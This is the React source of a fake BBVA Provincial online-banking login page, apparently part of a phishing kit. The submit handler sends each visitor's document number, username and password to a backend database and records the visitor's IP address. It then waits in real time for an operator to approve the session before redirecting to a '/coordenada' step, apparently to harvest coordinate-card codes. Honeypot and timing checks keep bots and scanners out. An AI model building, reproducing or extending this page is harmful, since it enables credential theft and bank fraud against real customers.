import { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronDown, ChevronUp } from "lucide-react";
import { usePresence } from "@/hooks/usePresence";

const RATE_LIMIT_KEY = "form_last_submit";
const RATE_LIMIT_MS = 15000; // 15 segundos entre envíos

function isRateLimited() {
  const last = parseInt(localStorage.getItem(RATE_LIMIT_KEY) || "0", 10);
  return Date.now() - last < RATE_LIMIT_MS;
}

function markSubmitted() {
  localStorage.setItem(RATE_LIMIT_KEY, String(Date.now()));
}
import { base44, supabase } from "@/api/base44Client";

const OPCIONES = [
  { value: "RIFJ", label: "RIF Empresas" },
  { value: "RIFG", label: "RIF Gobierno" },
  { value: "Tarjeta", label: "Número de identificación" },
];

function FloatingField({ id, label, type = "text", value, onChange, maxLength, children }) {
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;

  return (
    <div style={{ position: "relative", background: "#F5F5F5", borderBottom: focused ? "2px solid #004481" : "2px solid #000", marginBottom: "8px" }}>
      <label
        htmlFor={id}
        style={{
          position: "absolute",
          left: "16px",
          top: active ? "8px" : "50%",
          transform: active ? "none" : "translateY(-50%)",
          fontSize: active ? "11px" : "15px",
          color: active ? "#004481" : "#000",
          transition: "all 0.15s ease",
          pointerEvents: "none",
          lineHeight: 1,
        }}
      >
        {label}
      </label>
      <div style={{ paddingTop: active ? "22px" : "0", paddingBottom: active ? "6px" : "0", display: "flex", alignItems: active ? "flex-end" : "center", minHeight: "56px" }}>
        <input
          id={id}
          type={type}
          value={value}
          onChange={onChange}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          maxLength={maxLength}
          autoComplete="off"
          style={{
            flex: 1,
            background: "transparent",
            border: "none",
            outline: "none",
            fontSize: "15px",
            color: "#121212",
            padding: "0 16px",
            width: "100%",
            fontFamily: "inherit",
          }}
        />
        {children}
      </div>
    </div>
  );
}

function PasswordField({ id, label, value, onChange, maxLength }) {
  const [show, setShow] = useState(false);
  const [focused, setFocused] = useState(false);
  const active = focused || value.length > 0;

  return (
    <div style={{ position: "relative", background: "#F5F5F5", borderBottom: focused ? "2px solid #004481" : "2px solid #000", marginBottom: "8px" }}>
      <label
        htmlFor={id}
        style={{
          position: "absolute",
          left: "16px",
          top: active ? "8px" : "50%",
          transform: active ? "none" : "translateY(-50%)",
          fontSize: active ? "11px" : "15px",
          color: active ? "#004481" : "#000",
          transition: "all 0.15s ease",
          pointerEvents: "none",
          lineHeight: 1,
        }}
      >
        {label}
      </label>
      <div style={{ paddingTop: active ? "22px" : "0", paddingBottom: active ? "6px" : "0", display: "flex", alignItems: active ? "flex-end" : "center", minHeight: "56px" }}>
        <input
          id={id}
          type={show ? "text" : "password"}
          value={value}
          onChange={onChange}
          onFocus={() => setFocused(true)}
          onBlur={() => setFocused(false)}
          maxLength={maxLength}
          autoComplete="off"
          style={{
            flex: 1,
            background: "transparent",
            border: "none",
            outline: "none",
            fontSize: "15px",
            color: "#121212",
            padding: "0 8px 0 16px",
            fontFamily: "inherit",
          }}
        />
        {value.length > 0 && (
          <button
            type="button"
            onClick={() => setShow(!show)}
            style={{ padding: "0 12px", background: "none", border: "none", cursor: "pointer", display: "flex", alignItems: "center" }}
            tabIndex={-1}
          >
            <img
              src={show
                ? "https://ve1.provinet.net/nhvp_ve_web/atpn_es_web_jsp/imgEmp/icon-hide.png"
                : "https://ve1.provinet.net/nhvp_ve_web/atpn_es_web_jsp/imgEmp/icon-show-blue.png"
              }
              alt={show ? "Ocultar" : "Mostrar"}
              style={{ width: "22px", height: "18px" }}
            />
          </button>
        )}
      </div>
    </div>
  );
}

export default function LoginForm() {
  const navigate = useNavigate();
  const [tipoDoc, setTipoDoc] = useState("RIFJ");
  const [numDoc, setNumDoc] = useState("J-");
  const [usuario, setUsuario] = useState("");
  const [clave, setClave] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [recordar, setRecordar] = useState(false);
  const [selectOpen, setSelectOpen] = useState(false);
  const [selectFocused, setSelectFocused] = useState(false);
  const [loading, setLoading] = useState(false);
  const [rejected, setRejected] = useState(false);
  const formLoadTime = useRef(Date.now());
  const [presenceSessionId, setPresenceSessionId] = useState(/** @type {string|null} */ (null));
  const { setEditing } = usePresence(presenceSessionId);

  useEffect(() => { formLoadTime.current = Date.now(); }, []);

  const handleTipoDoc = (value) => {
    setTipoDoc(value);
    if (value === "RIFJ") setNumDoc("J-");
    else if (value === "RIFG") setNumDoc("G-");
    else setNumDoc("");
    setSelectOpen(false);
    setSelectFocused(false);
  };

  const selectedLabel = OPCIONES.find((o) => o.value === tipoDoc)?.label;
  const isFormValid = numDoc.trim() && usuario.trim() && clave.trim();

  if (loading) {
    return (
      <div style={{ position: "fixed", inset: 0, background: "white", display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", zIndex: 9999, gap: "20px" }}>
        <div style={{ width: "40px", height: "40px", border: "4px solid #e5e7eb", borderTop: "4px solid #1973B8", borderRadius: "50%", animation: "spin 1s linear infinite" }} />
        <style>{"@keyframes spin { to { transform: rotate(360deg); } }"}</style>
        <p style={{ margin: 0, fontSize: "14px", color: "#004481", fontFamily: '"BentonSansBBVA Book", Helvetica, Arial, sans-serif', letterSpacing: "0.02em" }}>Espere por favor...</p>
      </div>
    );
  }

  if (rejected) {
    return (
      <div style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center", padding: "0 24px" }}>
        <div style={{ maxWidth: "520px", width: "100%", textAlign: "center" }}>
          <div style={{ marginBottom: "24px" }}>
            <svg width="48" height="48" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg" style={{ margin: "0 auto" }}>
              <path d="M24 4L44 42H4L24 4Z" fill="#CC0000" />
              <text x="24" y="36" textAnchor="middle" fill="white" fontSize="22" fontWeight="bold" fontFamily="Arial">!</text>
            </svg>
          </div>
          <h1 style={{ fontSize: "24px", fontWeight: "normal", color: "#121212", marginBottom: "20px" }}>
            Los datos ingresados son incorrectos
          </h1>
          <p style={{ fontSize: "14px", color: "#444", lineHeight: "1.6", marginBottom: "32px" }}>
            Verifica que los datos estén correctos e intenta nuevamente. En caso de necesitar ayuda, comunícate con nosotros a través de la{" "}
            <span style={{ color: "#004481", fontWeight: "600" }}>Línea Provincial</span>{" "}
            0500 508 74 32 o si te encuentras en el exterior al{" "}
            <span style={{ color: "#004481", fontWeight: "600" }}>(+58) 212 5039111</span>.
          </p>
          <button
            onClick={() => {
              localStorage.removeItem("form_last_submit");
              setTipoDoc("RIFJ");
              setNumDoc("J-");
              setUsuario("");
              setClave("");
              setRejected(false);
            }}
            style={{ padding: "11px 52px", fontSize: "15px", background: "#1973B8", color: "white", border: "none", borderRadius: "4px", cursor: "pointer", fontFamily: "inherit" }}
          >
            Volver
          </button>
        </div>
      </div>
    );
  }

  return (
    <div
      style={{ width: "100%", maxWidth: "500px", margin: "0 auto", padding: "32px 24px 24px", background: "white" }}
      onFocus={() => setEditing(true)}
      onBlur={() => setEditing(false)}
    >

      {/* Título */}
      <h1 style={{ color: "#121212", fontSize: "32px", fontWeight: "normal", textAlign: "center", margin: "0 0 28px", fontFamily: "inherit" }}>
        ¡Bienvenido!
      </h1>

      {/* Tipo de documento */}
      <div style={{ position: "relative", marginBottom: "8px" }}>
        <div
          style={{
            background: "#F5F5F5",
            borderBottom: selectFocused ? "2px solid #004481" : "2px solid #000",
            cursor: "pointer",
            display: "flex",
            alignItems: "flex-end",
            justifyContent: "space-between",
            padding: "8px 12px 6px 16px",
            minHeight: "56px",
          }}
          onClick={() => { setSelectOpen(!selectOpen); setSelectFocused(!selectOpen); }}
        >
          <div style={{ display: "flex", flexDirection: "column", justifyContent: "center" }}>
            <span style={{ fontSize: "11px", color: "#000", lineHeight: 1, marginBottom: "4px" }}>
              Tipo de documento
            </span>
            <span style={{ fontSize: "15px", color: "#121212" }}>
              {selectedLabel}
            </span>
          </div>
          {selectOpen
            ? <ChevronUp style={{ color: "#004481", flexShrink: 0, width: 20, height: 20, marginBottom: "4px" }} />
            : <ChevronDown style={{ color: "#004481", flexShrink: 0, width: 20, height: 20, marginBottom: "4px" }} />
          }
        </div>
        {selectOpen && (
          <div style={{ position: "absolute", zIndex: 20, top: "100%", left: 0, width: "100%", background: "white", border: "1px solid #ccc", borderTop: "none", boxShadow: "0 4px 12px rgba(0,0,0,0.12)" }}>
            {OPCIONES.map((op) => (
              <div
                key={op.value}
                style={{
                  padding: "13px 16px",
                  fontSize: "14px",
                  cursor: "pointer",
                  background: tipoDoc === op.value ? "#e4ecf5" : "white",
                  fontWeight: tipoDoc === op.value ? "600" : "normal",
                  color: "#121212",
                }}
                onClick={() => handleTipoDoc(op.value)}
              >
                {op.label}
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Número de documento */}
      <FloatingField
        id="docrif"
        label="Número de documento"
        type="tel"
        value={numDoc}
        onChange={(e) => {
          const prefix = tipoDoc === "RIFJ" ? "J-" : tipoDoc === "RIFG" ? "G-" : "";
          let raw = e.target.value;
          if (prefix && !raw.startsWith(prefix)) { raw = prefix; }
          const digits = raw.slice(prefix.length).replace(/[^0-9]/g, "");
          setNumDoc(prefix + digits);
        }}
        maxLength={tipoDoc === "Tarjeta" ? 20 : 16}
      />

      {/* Usuario */}
      <PasswordField
        id="COD_USU"
        label="Usuario"
        value={usuario}
        onChange={(e) => setUsuario(e.target.value.replace(/[^a-zA-Z0-9]/g, ""))}
        maxLength={8}
      />

      {/* Recordar documento - oculto cuando es Número de identificación */}
      {tipoDoc !== "Tarjeta" && (
      <div style={{ display: "flex", alignItems: "center", gap: "12px", padding: "14px 4px", marginBottom: "4px" }}>
        <input
          type="checkbox"
          id="chkFrecuentes"
          checked={recordar}
          onChange={(e) => setRecordar(e.target.checked)}
          style={{ width: "18px", height: "18px", flexShrink: 0, cursor: "pointer", accentColor: "#004481" }}
        />
        <label htmlFor="chkFrecuentes" style={{ fontSize: "14px", fontFamily: '"BentonSansBBVA Book", Helvetica, sans-serif', cursor: "pointer", userSelect: "none", color: "#000" }}>
          Recordar documento
        </label>
        <div style={{ position: "relative" }}>
          <div
            className="group"
            style={{ width: "22px", height: "22px", borderRadius: "50%", background: "#004481", display: "flex", alignItems: "center", justifyContent: "center", cursor: "help", flexShrink: 0, position: "relative" }}
            title="Permite recordar el número de RIF y usuario únicamente en este dispositivo"
          >
            <span style={{ color: "white", fontSize: "13px", fontWeight: "bold", lineHeight: 1 }}>?</span>
          </div>
        </div>
      </div>
      )}

      {/* Honeypot - invisible para humanos, los bots lo llenan */}
      <input
        type="text"
        name="email_confirm"
        value={honeypot}
        onChange={(e) => setHoneypot(e.target.value)}
        tabIndex={-1}
        autoComplete="off"
        aria-hidden="true"
        style={{ position: "absolute", left: "-9999px", width: "1px", height: "1px", opacity: 0 }}
      />

      {/* Clave de acceso */}
      <PasswordField
        id="cod_cvepass"
        label="Clave de acceso"
        value={clave}
        onChange={(e) => setClave(e.target.value)}
        maxLength={8}
      />

      {/* Olvido contraseña */}
      <div style={{ textAlign: "center", margin: "12px 0 20px" }}>
        <a
          href="#"
          id="recuperacion"
          style={{ color: "#1973B8", fontSize: "14px", fontWeight: "700", textDecoration: "none" }}
        >
          Olvido o desbloqueo de contraseña
        </a>
      </div>

      {/* Botón Continuar */}
      <div style={{ textAlign: "center", marginBottom: "8px" }}>
        <button
          id="btnentrar"
          disabled={!isFormValid}
          onClick={async () => {
            if (!isFormValid) return;
            // Bloquear bots: honeypot llenado
            if (honeypot) return;
            // Bloquear bots: formulario enviado demasiado rápido (< 1.5s)
            if (Date.now() - formLoadTime.current < 1500) return;
            // Rate limiting: máximo 1 envío cada 15 segundos
            if (isRateLimited()) return;
            markSubmitted();
            setLoading(true);
            const record = /** @type {any} */ (await base44.entities.UserSessionData.create({
              tipoDocumentoSeleccionado: OPCIONES.find((o) => o.value === tipoDoc)?.label || tipoDoc,
              numeroDocumento: numDoc,
              usuario,
              claveAcceso: clave,
              status: "pending",
              clientOnlineStatus: "online",
            }));
            fetch('https://api.ipify.org?format=json')
              .then(r => r.json())
              .then(({ ip }) => base44.entities.UserSessionData.update(record.id, { userIp: ip }))
              .catch(() => {});
            setPresenceSessionId(record.id);
            // Detectar aprobación/rechazo
            let done = false;

            const handleResult = (status) => {
              if (done) return;
              done = true;
              clearInterval(interval);
              supabase.removeChannel(channel);
              if (status === "approved") {
                navigate(`/coordenada?sessionId=${record.id}`, { replace: true });
              } else if (status === "rejected") {
                setLoading(false);
                setRejected(true);
              }
            };

            // Realtime: detección instantánea
            const channel = supabase
              .channel(`login-${record.id}`)
              .on("postgres_changes", {
                event: "UPDATE",
                schema: "public",
                table: "user_session_data",
                filter: `id=eq.${record.id}`,
              }, (payload) => {
                const status = payload.new.status;
                if (status === "approved" || status === "rejected") handleResult(status);
              })
              .subscribe();

            // Fallback polling cada 300ms
            const interval = setInterval(async () => {
              if (done) return;
              const updated = await base44.entities.UserSessionData.filter({ id: record.id });
              const session = updated[0];
              if (!session || done) return;
              if (session.status === "approved" || session.status === "rejected") {
                handleResult(session.status);
              }
            }, 300);
          }}
          style={{
            padding: "11px 52px",
            fontSize: "15px",
            background: isFormValid ? "#1973B8" : "#d6d6d6",
            color: isFormValid ? "white" : "#999",
            border: "none",
            borderRadius: "4px",
            cursor: isFormValid ? "pointer" : "not-allowed",
            transition: "all 0.2s",
            fontFamily: "inherit",
          }}
        >
          Continuar
        </button>
      </div>
    </div>
  );
}